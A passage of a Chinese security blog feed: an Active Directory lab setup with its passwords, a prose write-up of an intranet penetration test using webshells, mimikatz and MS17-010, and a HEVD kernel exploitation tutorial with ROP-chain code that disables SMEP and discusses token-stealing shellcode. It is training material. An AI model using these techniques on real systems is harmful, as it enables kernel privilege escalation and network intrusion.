    <content type="html"><![CDATA[<p>Windows Server 2012 配置</p><p>怀念大学时光，在学网络配置的时候就是用的winserver 2012，最近想探究内网就翻出来学一学。</p><span id="more"></span><h1 id="简单配置"><a class="markdownIt-Anchor" href="#简单配置"></a> 简单配置</h1><p>vmware虚拟机安装就不多说了，主要是网络，我配置了两块网卡</p><p><img src="https://img.joe1sn.top/uploads/big/04324c8189d171f96dc2af621b154b5a.png" alt="image-20240220154255996" /></p><ul><li>NAT：连接到物理机网络</li><li>WinDC：构建vmware的虚拟局域网</li></ul><p><strong>关于vmtool安装</strong></p><p>vmtool是通过DVD光盘的形式安装的，所以要开启自动检测；软盘也要相同的设置</p><p><img src="https://img.joe1sn.top/uploads/big/424cb1a1752ec50eba2a9cddfa3ddafe.png" alt="image-20240220154438580" /></p><p><img src="https://img.joe1sn.top/uploads/big/1a3e734f5f1f39c70b37396988f728d2.png" alt="image-20240220194750242" /></p><p>装完了过后就很方便了</p><p><img src="https://img.joe1sn.top/uploads/big/b7052e36191aa37e0444c49b8db6dca4.png" alt="image-20240220195029170" /></p><p><strong>关闭防火墙</strong></p><p><img src="https://img.joe1sn.top/uploads/big/5ebdfad64ee12e608fd34888552774de.png" alt="image-20240220201714316" /></p><p><strong>开启远程桌面</strong></p><p><img src="https://img.joe1sn.top/uploads/big/a2c2806a73493336ff584dc89b1a2e90.png" alt="image-20240220201937426" /></p><p><strong>配置路由</strong></p><p>添加角色和功能 里面选择</p><p><img src="https://img.joe1sn.top/uploads/big/7ac5e3f9094228bfc9673c683f0ac16f.png" alt="image-20240220205319110" /></p><p><img src="https://img.joe1sn.top/uploads/big/9e953a19d0ec998318f4991715cfbcb0.png" alt="image-20240220205428596" /></p><p><img src="https://img.joe1sn.top/uploads/big/6c049825d969901eeb7d04a8ea0ea238.png" alt="image-20240220205529418" /></p><p><img src="https://img.joe1sn.top/uploads/big/eda3b70f4cfe8af3331a3c61a7b73d27.png" alt="image-20240220205544547" /></p><p><img src="https://img.joe1sn.top/uploads/big/260d8fe5e6ffd4dca14a1f78eb264fa9.png" alt="image-20240220210335831" /></p><p><strong>配置DHCP服务器</strong>（非必要）</p><p>添加角色和功能 里面选择</p><p><img src="https://img.joe1sn.top/uploads/big/60c32189c75a45fb849679e54137826e.png" alt="image-20240220202957415" /></p><p>创建和激活作用域：工具-&gt;DHCP</p><p><img src="https://img.joe1sn.top/uploads/big/e192caa4fad9f4ec4579b2e2f4274107.png" alt="image-20240220203415473" /></p><p><img src="https://img.joe1sn.top/uploads/big/104146589d90251c8145eb47a01ada16.png" alt="image-20240220203453553" /></p><p><img src="https://img.joe1sn.top/uploads/big/fa701127705cf339948c583f2c3c49b1.png" alt="image-20240220203613597" /></p><p><img src="https://img.joe1sn.top/uploads/big/2f7b9deb52c720b87d605b4561725d27.png" alt="image-20240220203727375" /></p><h1 id="ad活动目录配置"><a class="markdownIt-Anchor" href="#ad活动目录配置"></a> AD活动目录配置</h1><p><img src="https://img.joe1sn.top/uploads/big/eac3a65542cc3da641082bbd50d83a10.png" alt="image-20240220195749097" /></p><p>AD和域控制器DC都在虚拟机上。<br />为了测试，安排一个Win7</p><p>局域网</p><p><img src="https://img.joe1sn.top/uploads/big/0d0f7731366a3337957506b417e30933.png" alt="image-20240220203525303" /></p><h2 id="windows-7客户机"><a class="markdownIt-Anchor" href="#windows-7客户机"></a> Windows 7客户机</h2><p><img src="https://img.joe1sn.top/uploads/big/3d238e27f7cb3b5fb8df8863ee4374c6.png" alt="image-20240220200259734" /></p><p>配置内网静态IP，设置DNS为域服务器IP</p><p><img src="https://img.joe1sn.top/uploads/big/bbb70a67886e721cc74c6746623e6575.png" alt="image-20240220210343006" /></p><h2 id="配置dc域控"><a class="markdownIt-Anchor" href="#配置dc域控"></a> 配置DC域控</h2><p><img src="https://img.joe1sn.top/uploads/big/cbc81c44aff72d5b8e8b7d18d2cd2fe6.png" alt="image-20240220210858648" /></p><p><strong>提升为域控制器</strong></p><p><img src="https://img.joe1sn.top/uploads/big/1e6d4c92b519dcb5f4a6125a36b5e836.png" alt="image-20240220211100722" /></p><p><img src="https://img.joe1sn.top/uploads/big/546c8b3c9e8ca6018510adc83bad0f17.png" alt="image-20240220211450090" /></p><p><img src="https://img.joe1sn.top/uploads/big/a5ab50bd868ad0264bc9ee1aa7a8b2be.png" alt="image-20240220211640177" /></p><p>密码：<code>!234rewq</code></p><p><img src="https://img.joe1sn.top/uploads/big/a87cf749a0ba22a28bcf755db19d187c.png" alt="image-20240220212039995" /></p><p>设置Administrator账户的密码为<code>$321qwer</code></p><h2 id="创建用户组织"><a class="markdownIt-Anchor" href="#创建用户组织"></a> 创建用户组织</h2><p>用户组织可以用于委派等，是对组操作的最小单位</p><p>使用部门-&gt;个人的划分</p><p>这里就设置为 <code>UserA</code>部门的<code>Alan</code>用户</p><p><img src="https://img.joe1sn.top/uploads/big/74fa13cac064d4b1623ddb18a66a0bae.png" alt="image-20240220212755948" /></p><p><img src="https://img.joe1sn.top/uploads/big/6ed53ccc43e8bb241b11bc9b7658bd37.png" alt="image-20240220213049949" /></p><p><img src="https://img.joe1sn.top/uploads/big/f37a54fbc11da01b70da17e4d5957c1c.png" alt="image-20240220213109593" /></p><p><img src="https://img.joe1sn.top/uploads/big/a26d08f2359c87d97dfad4e5976e8c55.png" alt="image-20240220213212092" /></p><p>密码：<code>!234rewq</code></p><h2 id="将用户添加到域"><a class="markdownIt-Anchor" href="#将用户添加到域"></a> 将用户添加到域</h2><p>检查域名解析</p><p><img src="https://img.joe1sn.top/uploads/big/f2d80c060501a96285d6e6c33ba88e87.png" alt="image-20240220213627950" /></p><p><img src="https://img.joe1sn.top/uploads/big/ad76a4cdefc82a3ead58744b9599b6f4.png" alt="image-20240220213649517" /></p><p><img src="https://img.joe1sn.top/uploads/big/1f48004c0d40293e57624da50613bd75.png" alt="image-20240220213719961" /></p><p><img src="https://img.joe1sn.top/uploads/big/0c5e940d0e5158199d238db35f324a0f.png" alt="image-20240220213754894" /></p><p>不能直接登录Alan的账户（因为是首次登陆），先登一次Admin的</p><p><img src="https://img.joe1sn.top/uploads/big/7249f4c2ace34c411aff0fdaf6246513.png" alt="image-20240220214022822" /></p><p>然后重新设置该客户端的账户和密码</p><p><img src="https://img.joe1sn.top/uploads/big/bf81843006e9515607e3528e9f9e21eb.png" alt="image-20240220214055242" /></p><p><img src="https://img.joe1sn.top/uploads/big/a61dc6e9db5de22f4e7e9f78af086276.png" alt="image-20240220214152900" /></p><p><img src="https://img.joe1sn.top/uploads/big/5d721ffcf3e62cd34603c41a2de86bbf.png" alt="image-20240220214401452" /></p><p><img src="https://img.joe1sn.top/uploads/big/f7fd8920af990f0611fd2b43f8da47b5.png" alt="image-20240220214553806" /></p><h1 id="密码汇总"><a class="markdownIt-Anchor" href="#密码汇总"></a> 密码汇总</h1><table><thead><tr><th>账户</th><th>密码</th><th>备注</th></tr></thead><tbody><tr><td>administrator</td><td>$321qwer</td><td>域管理员</td></tr><tr><td>Alan</td><td>!234rewq</td><td>首次登陆</td></tr><tr><td>Alan</td><td>$321qwer</td><td>首次登陆后更改密码</td></tr><tr><td>WinDC</td><td>1qazxsw@</td><td></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows Server 2012 配置&lt;/p&gt;
&lt;p&gt;怀念大学时光，在学网络配置的时候就是用的winserver 2012，最近想探究内网就翻出来学一学。&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/tags/notes/"/>
    
    <category term="pentest" scheme="https://joe1sn.eu.org/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>【内网】内网渗透测试-新手村</title>
    <link href="https://joe1sn.eu.org/2024/02/15/intranet/"/>
    <id>https://joe1sn.eu.org/2024/02/15/intranet/</id>
    <published>2024-02-15T02:58:20.000Z</published>
    <updated>2024-02-20T14:01:05.374Z</updated>
    
    <content type="html"><![CDATA[<p>简单一层内网测试</p><p>去年的一篇，简单一层内网测试</p><span id="more"></span><h2 id="入口点"><a class="markdownIt-Anchor" href="#入口点"></a> 入口点</h2><p>http://xxx:16xx8</p><p>入口是个OA办公系统，使用某漏洞可以文件上传最后webshell实现RCE</p><p>扫描内网发现存活主机，同时上传cs大马</p><p><img src="https://img.joe1sn.top/uploads/big/55f5c2cddd5ddff8ad695c8f5df1b1d7.png" alt="img" /></p><p>使用mimikatz抓取明文得到rdp密码后使用socks代理进入内网可以访问远程桌面</p><h2 id="内网i-监控服务器"><a class="markdownIt-Anchor" href="#内网i-监控服务器"></a> 内网I 监控服务器</h2><p>192.168.xx.50</p><p>该服务器存在ms17-010漏洞，但是有杀软，尝试使用psexec文件上传执行RCE失败，因为被杀软拦截了，可能修改横向移动方式能够绕过</p><p>也可以尝试使用command一句话+web_delivery上线</p><p>不过好在入口权限够高，192.168.xx.100时也扫出了RDP密码，也是直接上线了</p><h2 id="内网ii-dhcp服务器"><a class="markdownIt-Anchor" href="#内网ii-dhcp服务器"></a> 内网II DHCP服务器</h2><p>192.168.xx.250</p><p>一般来说DHCP服务器是域服务器，mimikatz没有抓到密码，不过还好有ms17-010漏洞，但是由于当时我没有使用正向payload所以使用的就是 web_delivery+command 上线，之后把msf的shell传递给cs来扫密码，得到密码后使用代理RDP上线</p><p>查看相关配置后基本可以肯定就是内网AD域控服务器</p><p><img src="https://img.joe1sn.top/uploads/big/566885954f29e1e98f1bab9911605446.png" alt="img" /></p><h2 id="内网iii-路由器网关"><a class="markdownIt-Anchor" href="#内网iii-路由器网关"></a> 内网III 路由器网关</h2><p>192.168.xx.1</p><p>H3C的交换机 没有打下来</p><p><img src="https://img.joe1sn.top/uploads/big/8404f28f220ea986709e01a38b3537b4.png" alt="img" /></p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p><img src="https://img.joe1sn.top/uploads/big/276c06c1487481940bcf90703a512cfa.png" alt="image-20230215113845307" /></p><p>单层内网，结构简单，没有不出网的内网机器，新手村难度</p><p>基本全靠永恒之蓝+mimikatz，算是熟悉了工具和流程</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;简单一层内网测试&lt;/p&gt;
&lt;p&gt;去年的一篇，简单一层内网测试&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/tags/notes/"/>
    
    <category term="pentest" scheme="https://joe1sn.eu.org/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】HEVD-内核栈溢出(下)</title>
    <link href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-III/"/>
    <id>https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-III/</id>
    <published>2024-01-25T07:07:41.000Z</published>
    <updated>2024-02-24T03:52:04.469Z</updated>
    
    <content type="html"><![CDATA[<hr /><p>上：<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/">https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/</a></p><p>中：<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/">https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/</a></p><p>文章已在先知社区投稿：<a href="https://xz.aliyun.com/t/13365">https://xz.aliyun.com/t/13365</a></p><p>本附录对第二章的以下几个遗留问题做出说明</p><ul><li>user编程寻找ROPGadget</li><li>shellcode编写</li><li>Token提权</li><li>KVAS</li></ul><span id="more"></span><h1 id="user编程寻找ropgadget"><a class="markdownIt-Anchor" href="#user编程寻找ropgadget"></a> user编程寻找ROPGadget</h1><p>ROP全称加返回导向性编程，比如这一章用到的Gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rcx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">mov cr4, rcx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>关于<code>ret</code>汇编本质上就是从栈帧中取出值，然后将<code>ip</code>寄存器设置为该值，等价于<code>pop ip</code>，这样就能完成函数调用的返回等等。</p><p>本章中当我们发生栈溢出时，就会把<code>ret</code>的位置设置为第一段gadget的位置</p><ul><li><code>pop rcx</code>就会将此时栈顶的值<code>0x00000000002506f8</code>存入<code>rcx</code>寄存器，然后<code>ret</code>又从栈顶取出地址<code>mov_rc4_rcx_ret</code>，然后<code>rip</code>寄存器就跳转执行了</li><li><code>mov rc4, rcx</code>将<code>rcx</code>值存入<code>rc4</code>中然后<code>ret</code>又将栈顶的值<code>shellcode_addr</code>设置为<code>rip</code>寄存器的值后返回</li></ul><p>细心一点就会发现本章截图中的地址不一样，因为内核加载时的内存虚拟地址也是随机化的，不过寻址方式依旧是<code>基地址</code>+<code>偏移</code></p><p>这就引申出函数第一段代码：找到内核的基地址</p><h2 id="a找到内核基地址"><a class="markdownIt-Anchor" href="#a找到内核基地址"></a> A.找到内核基地址</h2><p>通过<code>NtQuerySystemInformation </code>这个“半隐藏”函数实现的</p><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation">https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQuerySystemInformation(</span><br><span class="line">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">  [in, out]       PVOID                    SystemInformation,</span><br><span class="line">  [in]            ULONG                    SystemInformationLength,</span><br><span class="line">  [out, optional] PULONG                   ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[in, out] SystemInformation</span><br></pre></td></tr></table></figure><p>指向接收请求信息的缓冲区的指针。 此信息的大小和结构因 <em>SystemInformationClass</em> 参数的值而异：</p></blockquote><p>很可惜，关于<code>SystemInformationClass</code>微软并没有公开它的设计，网上有很多关于此的资料</p><p><code>SYSTEM_INFORMATION_CLASS</code>：<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm</a></p><p>他是一个枚举，其中<code>0xB</code>就代表着要查询的是<code>SystemModuleInformation</code></p><p><code>SYSTEM_MODULE</code>：<a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html">http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_MODULE</span> &#123;</span><br><span class="line">  ULONG                Reserved1;</span><br><span class="line">  ULONG                Reserved2;</span><br><span class="line">  PVOID                ImageBaseAddress;</span><br><span class="line">  ULONG                ImageSize;</span><br><span class="line">  ULONG                Flags;</span><br><span class="line">  WORD                 Id;</span><br><span class="line">  WORD                 Rank;</span><br><span class="line">  WORD                 w018;</span><br><span class="line">  WORD                 NameOffset;</span><br><span class="line">  BYTE                 Name[MAXIMUM_FILENAME_LENGTH];</span><br><span class="line">&#125; SYSTEM_MODULE, *PSYSTEM_MODULE;</span><br></pre></td></tr></table></figure><p><code>SystemInformation</code>就是由<code>SYSTEM_MODULE</code>数组作为成员的结构体，这个没有官方文档，也是通过逆向得到的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE_INFORMATION</span> &#123;</span><br><span class="line">ULONG                ModulesCount;</span><br><span class="line">SYSTEM_MODULE        Modules[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;</span><br></pre></td></tr></table></figure><p>关于查询函数的定义：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulGetKernelBase</span><span class="params">(PCHAR ModuleName)</span></span>;</span><br></pre></td></tr></table></figure><ol><li>首先从<code>ntdll</code>导入函数</li><li>然后初始化变量</li><li>查询后打印并返回，如果没有查到就返回0</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulGetKernelBase</span><span class="params">(PCHAR ModuleName)</span> </span>&#123;</span><br><span class="line">PVOID kernelImageBase = <span class="literal">NULL</span>;</span><br><span class="line">PCHAR kernelImage = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//import function `NtQuerySystemInformation`</span></span><br><span class="line">HMODULE ntdll = <span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;ntdll&quot;</span>));</span><br><span class="line">PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)<span class="built_in">GetProcAddress</span>(ntdll, <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (NtQuerySystemInformation == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress() failed.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//init length</span></span><br><span class="line">ULONG len = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;len);</span><br><span class="line"><span class="comment">//init module infomations</span></span><br><span class="line">PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)<span class="built_in">GlobalAlloc</span>(GMEM_ZEROINIT, len);</span><br><span class="line"><span class="keyword">if</span> (pModuleInfo == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] [ulGetKernelBase]  Could not allocate memory for module info.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//starting quering</span></span><br><span class="line">NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation, pModuleInfo, len, &amp;len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0x0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] [ulGetKernelBase] NtQuerySystemInformation failed with error code 0x%X\n&quot;</span>, status);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; pModuleInfo-&gt;ModulesCount; i++) &#123;</span><br><span class="line">kernelImage = (PCHAR)pModuleInfo-&gt;Modules[i].Name;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(kernelImage, ModuleName)) &#123;</span><br><span class="line">kernelImageBase = pModuleInfo-&gt;Modules[i].ImageBaseAddress;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] [ulGetKernelBase]  Mod name %s &quot;</span>, kernelImage);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; Base Addr 0x%llx\r\n&quot;</span>, kernelImageBase);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; Base Addr 0x%X\r\n&quot;</span>, kernelImageBase);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)kernelImageBase;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="b-找到对应汇编"><a class="markdownIt-Anchor" href="#b-找到对应汇编"></a> B. 找到对应汇编</h2><p>可以使用CTF常用工具<code>ROPGadget</code>，他支持<code>PE</code>格式（因为用的Capstone反汇编引擎）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./HEVD.sys --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure><p>试试<code>ntoskrl.exe</code>的</p><p><img src="https://img.joe1sn.top/uploads/big/5932a20543fd1420ae321f901e1f4c44.png" alt="image-20240119172454699" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000014039eb47 : mov cr4, rcx ; ret</span><br></pre></td></tr></table></figure><p>得到基地址是<code>0x39eb47</code>，另外一个gadget同理</p><p>重写修改下EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_rcx = base+ <span class="number">0x20C64C</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> mov_cr4_rcx = base+ <span class="number">0x39eb47</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)pop_rcx;</span><br><span class="line"><span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)mov_cr4_rcx;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/14da4b6cf8f39c3a16855b7a20fbf476.png" alt="image-20240119174839482" /></p><p><img src="https://img.joe1sn.top/uploads/big/6c94aaf54fc86ee593668486a2df81a4.png" alt="image-20240119174924327" /></p><p>一些常见的gadget字节序列</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;RET&quot;</span> , &#123; <span class="number">0xC3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RAX&quot;</span>, &#123; <span class="number">0x58</span>, <span class="number">0xC3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RCX&quot;</span>, &#123; <span class="number">0x59</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_CR4_RCX&quot;</span>, &#123; <span class="number">0x0f</span>, <span class="number">0x22</span>, <span class="number">0xe1</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;NOP&quot;</span>, &#123; <span class="number">0x4d</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RAX_POP_RCX&quot;</span>, &#123; <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_RCX_PTRRAX&quot;</span>, &#123; <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x08</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_RAX_PTRRCX&quot;</span>, &#123; <span class="number">0x89</span>, <span class="number">0x01</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;XOR_RAX_RAX&quot;</span>, &#123; <span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;XOR_ESI_ESI&quot;</span>, &#123; <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br></pre></td></tr></table></figure><p>如果想直接从二进制读取（这样更快）可以使用：<a href="https://github.com/xct/windows-kernel-exploits">https://github.com/xct/windows-kernel-exploits</a> 提供的思路去找</p><h1 id="shellcode编写"><a class="markdownIt-Anchor" href="#shellcode编写"></a> shellcode编写</h1><h2 id="a-手动进行token提权"><a class="markdownIt-Anchor" href="#a-手动进行token提权"></a> A. 手动进行Token提权</h2><p>第二章中使用的是他人提供的shellcode，这里尝试自己写汇编</p><p>注意，这里我们已经进入内核了，所以做的事情和user级别不一样</p><p>同<code>KRPOCESS</code>不同的是<code>EPROCESS</code>描述了程序运行的相关环境，例如：对应的<code>KPROCESS</code>指针、程序的权限等</p><p>在windbg中使用 ，可以列举所有的进程的相关信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!process 0 0 &lt;process_name&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/d79ca59d6f4e93813d144c57ed739409.png" alt="image-20240119180801648" /></p><p>使用下面的命令来查看对应的EPROCESS结构体，这里查看<code>System</code>进程的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt nt!_EPROCESS &lt;Process address&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ab3f24cc80b2f59949d0f14718347944.png" alt="image-20240119181007630" /></p><p><img src="https://img.joe1sn.top/uploads/big/e55eccd39e6efc555de0f0b2aae95b32.png" alt="image-20240119181255215" /></p><p>Token是一个<code>_EX_FAST_REF</code>类型的Union值</p><p><img src="https://img.joe1sn.top/uploads/big/197b66077a9385505b318f09962398af.png" alt="image-20240119181935137" /></p><p><code>RefCnt</code>记录了Token引用的数目，是数据的低4位(64位中，32位是3位)</p><p>将当前进程的除<code>RefCnt</code>以外的其他bit位设置为和System的一致就行了，</p><p>这里 <code>Value</code>与掩码<code>-0xd</code>（RefCount）进行<code>&amp;</code>运算就能得到真实的Token值</p><p><img src="https://img.joe1sn.top/uploads/big/3783b0486f34520cceef6f7e7d4bc37b.png" alt="image-20240119183143972" /></p><p>现在将计算出的Token值复制给cmd.exe（<strong>这是一个新的Token</strong>）</p><p><img 